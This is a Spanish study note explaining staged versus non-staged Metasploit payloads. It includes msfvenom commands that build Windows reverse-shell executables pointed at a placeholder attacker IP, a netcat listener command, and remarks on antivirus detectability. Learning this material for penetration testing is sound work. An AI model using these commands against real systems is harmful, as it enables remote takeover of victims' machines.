---
tags:
  - Conceptos
---
# 🎫 Tipos de Payloads

Un payload es el código que se ejecuta en el sistema objetivo tras una explotación exitosa. En el contexto de Metasploit y msfvenom, los payloads se clasifican en dos categorías según cómo se entregan.

---

## Payload Staged

El payload se divide en **dos etapas**:

1. **Stage 0 (stager):** código pequeño que se envía al objetivo. Su única función es establecer la conexión de vuelta al atacante.
2. **Stage 1 (stage):** el payload real (p.ej. Meterpreter) que se descarga y ejecuta en memoria una vez establecida la conexión.

**Ventaja:** el stager es pequeño y más fácil de inyectar en exploits con espacio limitado.  
**Desventaja:** requiere que el atacante tenga un listener activo que sirva la segunda etapa.

Se identifican en msfvenom por una barra `/` separando el tipo: `meterpreter/reverse_tcp`

### Generación con msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  --platform Windows -a x64 \
  LHOST=<IP_ATACANTE> LPORT=4646 \
  -f exe -o reverse.exe
```

El listener debe ser Metasploit (`multi/handler`) para servir la segunda etapa correctamente.

---

## Payload Non-Staged

El payload completo se envía en **un solo bloque**. No hay segunda etapa: todo el código malicioso viaja junto y se ejecuta en cuanto llega al objetivo.

**Ventaja:** más sencillo, compatible con listeners básicos como Netcat.  
**Desventaja:** más fácil de detectar por AV/EDR al ser un bloque de código mayor.

Se identifican en msfvenom con guión bajo: `shell_reverse_tcp`

### Generación con msfvenom — listener Metasploit

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  --platform Windows -a x64 \
  LHOST=<IP_ATACANTE> LPORT=4646 \
  -f exe -o shell_meterpreter.exe
```

### Generación con msfvenom — listener Netcat

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  --platform Windows -a x64 \
  LHOST=<IP_ATACANTE> LPORT=4646 \
  -f exe -o shell_nc.exe
```

El listener en este caso puede ser simplemente:

```bash
nc -nlvp 4646
```

---

## Staged vs Non-Staged — resumen

| | Staged | Non-Staged |
|---|---|---|
| Tamaño inicial | Pequeño | Grande |
| Listener requerido | Metasploit | Netcat o Metasploit |
| Detección por AV | Más difícil | Más fácil |
| Complejidad | Mayor | Menor |

---

## Referencias

- [msfvenom cheatsheet — afsh4ck](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom)

```

https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom

